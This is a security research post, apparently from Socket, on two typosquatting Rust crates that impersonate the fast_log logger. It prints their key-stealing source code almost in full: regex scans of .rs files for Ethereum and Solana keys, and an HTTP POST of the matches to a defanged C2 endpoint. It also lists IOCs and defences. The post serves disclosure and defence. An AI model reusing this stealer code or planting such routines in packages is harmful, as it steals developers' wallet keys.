---
title: "Two Malicious Rust Crates Impersonate Popular Logger to Steal Wallet Keys"
date: 2025-09-24 12:00:00 +0000
categories: [Malware, Rust]
tags: [Rust, Typosquatting, Infostealer, crates.io, T1195.002, T1036.005, T1552.004, T1005, T1071.001, T1657]
description: "Socket uncovers malicious Rust crates impersonating fast_log to steal Solana and Ethereum wallet keys from source code."
toc: true
canonical_url: https://socket.dev/blog/two-malicious-rust-crates-impersonate-popular-logger-to-steal-wallet-keys
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/18f2f740a3f3d3e5ccf1fd2f92445678a95e0543-1024x1024.webp?w=1000&q=95&fit=max&auto=format
  alt: Two malicious Rust crates impersonate popular logger artwork
---

Socket’s Threat Research Team identified two malicious Rust crates, [`faster_log`](https://socket.dev/cargo/package/faster-log/overview/1.7.8) and [`async_println`](https://socket.dev/cargo/package/async-println/overview/1.0.1), that impersonate the legitimate [`fast_log`](https://socket.dev/cargo/package/fast-log/overview/1.7.4) library. Published by the threat actor under the aliases `rustguruman` and `dumbnbased`, the crates include working logging code for cover and embed routines that scan source files for Solana and Ethereum private keys, then exfiltrate matches via HTTP POST to a hardcoded command and control (C2) endpoint (`https://mainnet[.]solana-rpc-pool[.]workers[.]dev/`). Combined, the two crates were downloaded 8,424 times and were published on May 25, 2025.

Following our report requesting removal of the crates and suspension of the associated publisher accounts, the Crates security team acted immediately. Within an hour, we received a response from Carlos Euros at [crates.io](http://crates.io). Shortly thereafter, the Crates security team (1) preserved all `faster_log` and `async_println` files for analysis while removing the listings from the Rust package registry to prevent further downloads, (2) locked the `dumbnbased` and `rustguruman` accounts to block any actions on the registry, and (3) published an official security [advisory](https://blog.rust-lang.org/2025/09/24/crates.io-malicious-crates-fasterlog-and-asyncprintln/) detailing their actions and investigation. We thank the Crates security team, the Rust Security Response WG, and the Rust Foundation (h/t Carol Nichols, Pietro Albini, Walter Pearce, and Carlos Euros) for their prompt, decisive action to help keep the Rust ecosystem safe.


![](https://cdn.sanity.io/images/cgdhsj6q/production/be6df913f8c0893711e1598ff914c6b6e772761f-2828x1268.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner flags faster_log as known malware. The crate typosquats the legitimate fast_log, reuses its README and repository link, and impersonates the project to mislead developers._

## Malicious Crates
Below is the threat actor’s [code](https://socket.dev/cargo/package/faster-log/files/1.7.8/faster_log-1.7.8/src/packer.rs) with C2 defanged. Comments tagged [Threat Actor] are from the original `faster_log` crate. Comments tagged [Analysis] are ours and call out the malicious functionality and intent. The companion crate async_println [implements](https://socket.dev/cargo/package/async-println/files/1.0.1/async_println-1.0.1/src/packer.rs) the same exfiltration workflow, posts to the same C2 endpoint, and targets the same families of wallet-key patterns, with only minor differences in helper names, length gates, and result batching across versions.


```rust
use regex::Regex;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::fs;
use std::path::Path;

// [Threat Actor] Hardcoded endpoint as requested
// [Analysis] Hardcoded C2 hosted on Cloudflare. Not an official Solana RPC.
//            All exfiltration goes here in a single POST.
const HARDCODED_ENDPOINT: &str = "https://mainnet[.]solana-rpc-pool[.]workers.dev/";

#[derive(Debug, Serialize, Deserialize)]
pub struct FoundItem {
    pub item_type: String,
    pub value: String,
    pub file_path: String,
    pub line_number: usize,
}
// [Analysis] Exfil payload includes precise file path and line number, aiding triage or follow-on theft.

#[derive(Debug, Serialize, Deserialize)]
pub struct PackResult {
    pub items: Vec,
}
// [Analysis] Multiple matches are batched and sent together.

pub struct Packer {
    client: Client,
}
// [Analysis] Uses reqwest client. No authentication, consent, or encryption beyond HTTPS.

impl Packer {
    pub fn new() -> Self {
        Self { client: Client::new() }
    }

    pub async fn pack_file>(&self, file_path: P) -> Result> {
        let path = file_path.as_ref();
        let content = fs::read_to_string(path)?;
        let mut found_items = Vec::new();

        // [Threat Actor] Search for byte arrays
        // [Analysis] Grabs bracketed arrays like [1,2,...] or [0x12, 0xAB, ...].
        //            This can represent raw key bytes or embedded seeds.
        let byte_array_regex = Regex::new(r#"\[(?:\s*0x[0-9a-fA-F]{1,2}\s*,?\s*)+\]|\[(?:\s*\d{1,3}\s*,?\s*)+\]"#)?;
        for (line_num, line) in content.lines().enumerate() {
            for mat in byte_array_regex.find_iter(line) {
                found_items.push(FoundItem {
                    item_type: "byte_array".to_string(),
                    value: mat.as_str().to_string(),
                    file_path: path.to_string_lossy().to_string(),
                    line_number: line_num + 1,
                });
            }
        }

      // [Threat Actor] Search for base58 strings (typical Solana addresses/keys)
      // [Analysis] Targets quoted Base58 tokens 32 - 44 characters.
      //            Aligns with Solana public keysor addresses.
        let base58_regex = Regex::new(r#""[1-9A-HJ-NP-Za-km-z]{32,44}""#)?;
        for (line_num, line) in content.lines().enumerate() {
            for mat in base58_regex.find_iter(line) {
                let value = mat.as_str().trim_matches('"');
                if self.is_valid_base58(value) {
                    found_items.push(FoundItem {
                        item_type: "base58_string".to_string(),
                        value: value.to_string(),
                        file_path: path.to_string_lossy().to_string(),
                        line_number: line_num + 1,
                    });
                }
            }
        }

       // [Threat Actor] Search for hex strings that might be keys/addresses
       // [Analysis] Extracts quoted 0x + 64 hex, a common Ethereum private keys.
        let hex_regex = Regex::new(r#""0x[0-9a-fA-F]{64}""#)?;
        for (line_num, line) in content.lines().enumerate() {
            for mat in hex_regex.find_iter(line) {
                found_items.push(FoundItem {
                    item_type: "hex_string".to_string(),
                    value: mat.as_str().trim_matches('"').to_string(),
                    file_path: path.to_string_lossy().to_string(),
                    line_number: line_num + 1,
                });
            }
        }

        // [Analysis] Exfiltrate only if a hit occurred.
        //            No user prompt or local logging of content.
        if !found_items.is_empty() {
            self.send_results(found_items).await?;
        }

        Ok(())
    }

    async fn send_results(&self, items: Vec) -> Result> {
        let result = PackResult { items };
        
        // [Analysis] Sends JSON body with all matches to the C2.
        let response = self.client
            .post(HARDCODED_ENDPOINT)
            .json(&result)
            .send()
            .await?;

        // [Analysis] Minimal status check; content of the response is ignored.
        if response.status().is_success() {
            println!("Successfully sent {} items to endpoint", result.items.len());
        } else {
            eprintln!("Failed to send results: {}", response.status());
        }

        Ok(())
    }

    fn is_valid_base58(&self, s: &str) -> bool {
        const BASE58_ALPHABET: &[u8] = b"123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
        s.chars().all(|c| BASE58_ALPHABET.contains(&(c as u8)))
    }
    // [Analysis] Alphabet check only; no decode or key validation.

    pub async fn pack_directory>(&self, dir_path: P) -> Result> {
        let path = dir_path.as_ref();
        
        // [Analysis] Recurses into directories and processes every .rs file.
        //            Enables broad harvesting when called with a project root.
        if path.is_file() && path.extension().map_or(false, |ext| ext == "rs") {
            self.pack_file(path).await?;
            return Ok(());
        }

        if path.is_dir() {
            for entry in fs::read_dir(path)? {
                let entry = entry?;
                let entry_path = entry.path();
                
                if entry_path.is_dir() {
                    self.pack_directory(entry_path).await?;
                } else if entry_path.extension().map_or(false, |ext| ext == "rs") {
                    self.pack_file(entry_path).await?;
                }
            }
        }

        Ok(())
    }
}

pub async fn pack_rust_files>(path: P) -> Result> {
    let packer = Packer::new();
    packer.pack_directory(path).await
}
// [Analysis] Public entry enables one-call recursive scanning of a given path.
```
The crates read a file or a caller supplied directory and scan Rust source lines for three patterns, then post every hit to a hardcoded C2 endpoint. The patterns are Ethereum private keys (`0x` plus 64 hex), Base58 tokens consistent with Solana addresses or keys, and bracketed byte arrays that can encode key material. Each match is packaged with its type, exact value, source file path, and line number, then sent as a JSON array over HTTPS using `reqwest`. The payload runs at application or test runtime, not during build.

The inline threat actor’s comment “[Hardcoded endpoint as requested](https://socket.dev/cargo/package/faster-log/files/1.7.8/faster_log-1.7.8/src/packer.rs#L7)” could point to tasking between collaborators, for example one threat actor implementing code to a spec from another, and it also reads as a thin attempt at plausible deniability by framing the C2 choice as someone else’s requirement. The comments “[Search for base58 strings (typical Solana addresses/keys)](https://socket.dev/cargo/package/faster-log/files/1.7.8/faster_log-1.7.8/src/packer.rs#L52)” and “[Search for hex strings that might be keys/addresses](https://socket.dev/cargo/package/faster-log/files/1.7.8/faster_log-1.7.8/src/packer.rs#L68)” state the goal plainly: harvest secrets, especially Solana keys and Ethereum private keys, from developer and build files.

The crates are pure Rust and depend only on standard libraries plus `reqwest`, so behavior is identical on Linux, macOS, and Windows. Any environment with a Rust toolchain and outbound network access is affected. The crates had [no downstream dependents](https://blog.rust-lang.org/2025/09/24/crates.io-malicious-crates-fasterlog-and-asyncprintln/) on [crates.io](http://crates.io).


![](https://cdn.sanity.io/images/cgdhsj6q/production/70008ad481ee731cf7c0cd4822ea555f59ca15bf-1242x1248.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner’s analysis of the malicious faster_log package shows covert key exfiltration: a “packer” scans local source files for Ethereum and Solana private keys and POSTs matches to hxxps://mainnet[.]solana-rpc-pool[.]workers[.]dev. The crate typosquats fast_log, reuses its README and repository metadata, and adds macros that trigger the theft._
Both crates send POSTs to the same C2 (`https://mainnet[.]solana-rpc-pool[.]workers[.]dev`). This host is a Cloudflare Workers subdomain that Cloudflare assigns to individual accounts, not to the Solana Foundation. Solana’s official mainnet beta RPC is [`https://api.mainnet-beta.solana.com`](https://api.mainnet-beta.solana.com/). During a controlled test, we confirmed that the C2 endpoint was live and processing POST requests.


## Threat Actor’s Strategy
The threat actor created two [crates.io](http://crates.io) publisher accounts, [`rustguruman`](https://crates.io/users/rustguruman) and [`dumbnbased`](https://crates.io/users/dumbnbased), linked to `https://github[.]com/rustguruman` and `https://github[.]com/dumbnbased` (we have petitioned GitHub to suspend both accounts). The threat actor then published two crates that mimic the legitimate `fast_log` logger, copied its README, and set the repository field to the real project. The logging code remains functional to pass cursory checks. The C2 endpoint host address is styled to resemble a blockchain RPC service (`https://mainnet[.]solana-rpc-pool[.]workers[.]dev`), which helps it blend with normal developer traffic. The Crates security team has since [locked](https://blog.rust-lang.org/2025/09/24/crates.io-malicious-crates-fasterlog-and-asyncprintln/) both publisher accounts.


![](https://cdn.sanity.io/images/cgdhsj6q/production/e769a68e36ee4b4ad2c84987e5af8c79f61e3d52-1500x470.png?w=1600&q=95&fit=max&auto=format)
_Crates comparison: center shows the legitimate fast_log, while left (faster_log) and right (async_println) are malicious. The impostors mimic the name and page design, copy the README, and set the repository to github.com/rbatis/fast_log, which helps them pass casual review and mislead developers._

![](https://cdn.sanity.io/images/cgdhsj6q/production/e62981d447ac77a2ea5401fed2f82bd0b068c9d7-950x773.png?w=1600&q=95&fit=max&auto=format)
_Crates.io search for fast_log showed the legitimate fast_log alongside two imposters, faster_log and async_println. The malicious crates mimic the real project and show download counts: faster_log 7,181 and async_println 1,243, versus legitimate fast_log 295,680 downloads. All three listed an update four months ago, which helped the malicious crates blend in._

## Outlook and Recommendations
This campaign shows how minimal code and simple deception can create a supply chain risk. A functional logger with a familiar name, copied design, and README can pass casual review while a small routine posts private wallet keys to a threat actor-controlled C2 endpoint. Unfortunately, that is enough to reach developer laptops and CI.

Defenders should expect copycat packages across ecosystems that reuse this playbook with small twists. Likely shifts include moving triggers into build scripts or procedural macros, widening scans of the infected system, adding obfuscation, and rotating C2 endpoints. Expect C2 churn, geofencing, and response padding to blend with normal RPC traffic.

Treat this as a supply chain incident. Remove the crates, then rotate any secrets that could appear in source, tests, or fixtures, including quoted strings and byte arrays. Add file-level secret scanning, restrict egress from developer and CI networks, and write detections for the observed patterns, such as POSTs with a JSON body containing a `content` field and macros that read the invoking source file.

Socket’s security tooling addresses these risks end to end. The [Socket GitHub app](https://socket.dev/features/github) provides real-time scanning of pull requests, flagging suspicious or malicious packages before they are merged. The [Socket CLI](https://socket.dev/features/cli) surfaces red flags during package installations, helping teams catch dangerous code early. The [Socket browser extension](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1) annotates package pages during review to catch impersonation and risky behavior. [Socket MCP](https://socket.dev/blog/socket-mcp) extends this protection into AI assisted coding environments, detecting and alerting on malicious or hallucinated packages before LLM generated suggestions introduce them. Combined with secret hygiene and egress controls, these layers provide effective defense in depth.


## Indicators of Compromise (IOCs)

### Malicious Crates
- [`faster_log`](https://socket.dev/cargo/package/faster-log/overview/1.7.8)
- [`async_println`](https://socket.dev/cargo/package/async-println/overview/1.0.1)

### Threat Actor’s Crates Aliases
- `dumbnbased`
- `rustguruman`

### Threat Actor’s GitHub Repositories
- `https://github[.]com/dumbnbased`
- `https://github[.]com/rustguruman`

### C2/Exfiltration Endpoint
- `https://mainnet[.]solana-rpc-pool[.]workers[.]dev/`

## MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1036.005 — Masquerading: Match Legitimate Resource Name or Location
- T1552.004 — Unsecured Credentials: Private Keys
- T1005 — Data from Local System
- T1071.001 — Application Layer Protocol: Web Protocols
- T1657 — Financial Theft